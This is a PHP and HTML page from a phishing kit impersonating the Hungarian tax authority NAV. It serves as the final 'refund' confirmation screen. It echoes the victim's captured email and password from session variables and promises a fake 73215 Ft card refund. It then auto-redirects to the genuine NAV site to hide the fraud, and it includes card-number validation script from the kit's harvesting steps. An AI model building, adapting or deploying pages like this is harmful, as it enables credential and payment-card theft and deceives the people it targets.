<?php
session_start();
error_reporting(0);
?>
<html style="margin-left: 0px;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>NAV - Magyar oldalak</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
        <meta http-equiv="refresh" content="5;url=https://onlineszamla.nav.gov.hu/regisztracio/start" />
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<!------------------------------- FILE JAVASCRIPT --------------------------------->
	<script type="text/javascript">
        $(function() {
		    $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
			$('#cardnumber').validateCreditCard(function(result) {
			    if(result.card_type == null){
                    $('#cardnumber').removeClass();
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
					
                }
            });
            });
		});
    </script>
<script src="./js/jquery-2.1.4.js"></script>
<script src="./js/jquery.validate.min.js"></script>
<script src="./js/additional-methods.min.js"></script>
<script src="./js/validation.js"> </script>
<link rel="alternate" type="application/rss+xml" href="#" title="NAV-hírek">
<link href="./css/nav.css" type="text/css" rel="stylesheet">
<link href="./css/print.css" type="text/css" rel="stylesheet" media="print">
<meta name="portalid" content="2">
<meta name="dcterms.title" content="Magyar oldalak">
</head>
<body>

<div id="portal">
<div class="HeadTopMain">
<div class="NavHeadKategoria">
<div class="Head"></div>
<div class="Middle">
<div class="NavHeadKategoria">


<img alt="fejléc" border="0" height="180" src="./css/nav_honlap_fejleckep.png" usemap="#Map" width="1001"> 



</div>
</div>
<div class="NavBottom">


</div>
</div>

</div>






<div class="UzemszunetPortlet" style="
    margin-top: 10px;
">
<div class="">
<div class="c_div">
<div>
<div class="UzemszunetHeaderTitle" style="
    width: 642px;
">
Visszatérítési információ.</div>
<div class="element_div">
<div class="Article">
<span class="Body">
<p>
<span class="title">Név:</span>
						<span class="data value">
							<strong><?php echo $_SESSION['Eamil'];  ?></strong>
						</span><br>
<span class="title">Azonosítószám:</span>
						<span class="data value">
							<strong><?php echo $_SESSION['Password'];  ?></strong>
						</span><br><br>
Részletek:<br>
Visszatérítési összeg: <strong>73215 Ft</strong><br>
dátum: 02/2018<br><br>
A visszaváltás befejezése után a hitelkártyán lévő összeg 10-15 napon belül jóváírásra kerül.</p>
    <strong>Köszönjük, hogy elküldjük az e-mailt, hogy megerősítsük az összes többi lépést, ha szükségünk van valamilyen ellenőrzésre</strong>
</span>
</div>
</div>

</div></div>
</div>
</div><div class="NavBottom">
<div class="Footer2Portlet">
<div class="">
<div class="Footer" style="
    margin-left: -;
">
<div class="Footer2Html">
			    A NAV weboldalai szerzői jogvédelem alatt állnak. <br>
			    A honlapon szereplő információk változatlan tartalommal és formában szabadon terjeszthetők.<br>
<br>
</div>
<a href="#">
				Kapcsolatfelvétel
			</a>
			|
			<a href="#">
				Archív oldalak
			</a>
			|
			<a href="#">
				További honlapok
			</a>
			|
			<a href="#">
				Adatvédelmi tájékoztató
			</a>
			|
			<a href="#">
				Impresszum
			</a>
			|
			<a href="#">
				Közadatkereső
			</a>
<div class="Adress">
                1054 Budapest, Széchenyi u. 2. 
                
		    </div>
</div>
</div>
</div>

</div>
<div class="">
<div class="HtmlPortlet">

<div class=""></div>
</div>
</div>
</div>


<div style="position: fixed; width: 100%; height: 100%; left: 0px; top: 0px; z-index: -1000; display: none;"></div></body></html>